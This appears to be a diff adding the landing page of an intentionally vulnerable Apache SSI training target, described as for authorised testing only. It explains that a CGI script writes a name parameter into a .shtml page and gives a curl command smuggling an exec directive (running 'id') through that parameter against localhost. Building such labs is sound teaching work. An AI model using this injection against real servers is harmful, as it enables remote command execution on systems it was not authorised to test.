@@ -1,0 +1,16 @@
+<html>
+<head><title>M05 SSI vhost</title></head>
+<body>
+<h1>Legacy SSI vhost (Apache httpd 2.4 + mod_include)</h1>
+<p>Intentionally vulnerable training target. Authorised testing only.</p>
+<ul>
+  <li><a href="/demo.shtml">/demo.shtml</a> - static SSI proof (echo + exec)</li>
+  <li>/cgi-bin/greet.cgi?name=YOUR_NAME - writes your name into a .shtml page
+      and redirects to it. SSI directives in <code>name</code> are executed.</li>
+</ul>
+<pre>
+curl -i 'http://127.0.0.1:8505/cgi-bin/greet.cgi?name=%3C!--%23exec%20cmd=%22id%22%20--%3E'
+# follow the Location header -> uid=33(www-data) appears in the HTML
+</pre>
+</body>
+</html>
